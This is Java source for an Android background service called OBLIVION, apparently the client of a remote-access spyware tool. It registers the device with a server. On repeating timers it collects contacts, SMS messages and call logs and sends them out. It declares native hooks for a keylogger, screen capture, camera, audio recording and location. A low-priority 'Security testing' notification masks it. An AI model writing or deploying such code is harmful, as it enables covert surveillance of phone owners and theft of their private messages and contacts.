package com.OBLIVION.agent;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import androidx.core.app.NotificationCompat;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class OBLIVIONService {
    private static final String TAG = "OBLIVIONService";
    private static final int NOTIFICATION_ID = 1001;
    private static final String CHANNEL_ID = "OBLIVION_channel";
    
    private Context context;
    private Handler mainHandler;
    private ScheduledExecutorService scheduler;
    private boolean isConnected = false;
    private String deviceId;
    private int dataCount = 0;
    
    // Native methods (implemented in C++)
    static {
        System.loadLibrary("OBLIVION");
    }
    
    public native String nativeInit(String deviceId);
    public native String nativeGetDeviceInfo();
    public native String nativeGetContacts();
    public native String nativeGetSms();
    public native String nativeGetCallLogs();
    public native String nativeGetLocation();
    public native String nativeTakePhoto();
    public native String nativeStartRecording();
    public native String nativeStopRecording();
    public native String nativeCaptureScreen();
    public native String nativeStartKeylogger();
    public native String nativeStopKeylogger();
    public native String nativeGetInstalledApps();
    public native String nativeRunSecurityScan();
    public native boolean nativeConnect(String serverUrl);
    public native void nativeDisconnect();
    public native boolean nativeSendData(String dataType, String data);
    
    public OBLIVIONService() {
        deviceId = Settings.Secure.getString(
            context == null ? null : context.getContentResolver(),
            Settings.Secure.ANDROID_ID
        );
        if (deviceId == null || deviceId.isEmpty()) {
            deviceId = "unknown";
        }
        mainHandler = new Handler(Looper.getMainLooper());
        scheduler = Executors.newScheduledThreadPool(4);
    }
    
    public void start(Context context) {
        this.context = context;
        createNotificationChannel();
        startForegroundService();
        initializeNative();
        startHeartbeat();
        startDataCollection();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "OBLIVION Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Security testing framework");
            NotificationManager manager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private void startForegroundService() {
        Notification notification = new NotificationCompat.Builder(context, CHANNEL_ID)
            .setContentTitle("OBLIVION Security")
            .setContentText("Security testing active")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
        
        if (context instanceof Service) {
            ((Service) context).startForeground(NOTIFICATION_ID, notification);
        }
    }
    
    private void initializeNative() {
        nativeInit(deviceId);
        String deviceInfo = nativeGetDeviceInfo();
        // Send device info to server
        nativeSendData("device_info", deviceInfo);
    }
    
    private void startHeartbeat() {
        scheduler.scheduleAtFixedRate(() -> {
            try {
                // Send heartbeat to server
                String status = isConnected ? "online" : "offline";
                nativeSendData("heartbeat", "{\"status\":\"" + status + "\",\"battery\":\"" + getBatteryLevel() + "\"}");
                mainHandler.post(() -> {
                    // Update UI if needed
                });
            } catch (Exception e) {
                // Handle error
            }
        }, 0, 30, TimeUnit.SECONDS);
    }
    
    private void startDataCollection() {
        // Collect contacts every 5 minutes
        scheduler.scheduleAtFixedRate(() -> {
            try {
                String contacts = nativeGetContacts();
                if (contacts != null && !contacts.isEmpty()) {
                    nativeSendData("contacts", contacts);
                    dataCount++;
                }
            } catch (Exception e) {
                // Handle error
            }
        }, 1, 300, TimeUnit.SECONDS);
        
        // Collect SMS every 10 minutes
        scheduler.scheduleAtFixedRate(() -> {
            try {
                String sms = nativeGetSms();
                if (sms != null && !sms.isEmpty()) {
                    nativeSendData("sms", sms);
                    dataCount++;
                }
            } catch (Exception e) {
                // Handle error
            }
        }, 2, 600, TimeUnit.SECONDS);
        
        // Collect call logs every 15 minutes
        scheduler.scheduleAtFixedRate(() -> {
            try {
                String calls = nativeGetCallLogs();
                if (calls != null && !calls.isEmpty()) {
                    nativeSendData("calls", calls);
                    dataCount++;
                }
            } catch (Exception e) {
                // Handle error
            }
        }, 3, 900, TimeUnit.SECONDS);
    }
    
    private String getBatteryLevel() {
        // Simplified - would use BatteryManager
        return "100";
    }
    
    public String getDeviceId() {
        return deviceId;
    }
    
    public String getServerStatus() {
        return isConnected ? "Connected" : "Disconnected";
    }
    
    public boolean isConnected() {
        return isConnected;
    }
    
    public int getDataCount() {
        return dataCount;
    }
    
    public void connectToServer(String serverUrl) {
        isConnected = nativeConnect(serverUrl);
        if (isConnected) {
            nativeSendData("registration", "{\"device_id\":\"" + deviceId + "\",\"type\":\"OBLIVION_agent\"}");
        }
    }
    
    public void disconnect() {
        nativeDisconnect();
        isConnected = false;
    }
    
    public String runSecurityScan() {
        return nativeRunSecurityScan();
    }
    
    public void stop() {
        scheduler.shutdown();
        disconnect();
    }
}